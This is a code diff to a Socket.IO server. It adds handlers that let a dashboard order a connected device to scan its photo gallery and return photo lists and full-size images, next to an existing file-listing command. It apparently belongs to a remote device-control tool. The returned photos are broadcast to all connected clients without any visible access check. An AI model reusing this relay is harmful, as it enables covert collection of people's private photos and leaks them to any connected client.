@@ -167,6 +167,38 @@ io.on('connection', (socket) => {
     });
   });
 
+  // Dashboard requests gallery/photos from device
+  socket.on('command:gallery:scan', ({ deviceId }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:gallery:scan');
+    }
+  });
+
+  // Device sends gallery photos list
+  socket.on('gallery:photos', (data) => {
+    socket.broadcast.emit('gallery:photos', {
+      deviceId: socket.deviceId,
+      ...data
+    });
+  });
+
+  // Dashboard requests full-size photo
+  socket.on('command:gallery:get', ({ deviceId, photoId }) => {
+    const targetSocketId = deviceSockets.get(deviceId);
+    if (targetSocketId) {
+      io.to(targetSocketId).emit('command:gallery:get', { photoId });
+    }
+  });
+
+  // Device sends full-size photo
+  socket.on('gallery:photo', (data) => {
+    socket.broadcast.emit('gallery:photo', {
+      deviceId: socket.deviceId,
+      ...data
+    });
+  });
+
   // Dashboard requests file listing
   socket.on('command:files:list', ({ deviceId, path: dirPath }) => {
     const targetSocketId = deviceSockets.get(deviceId);
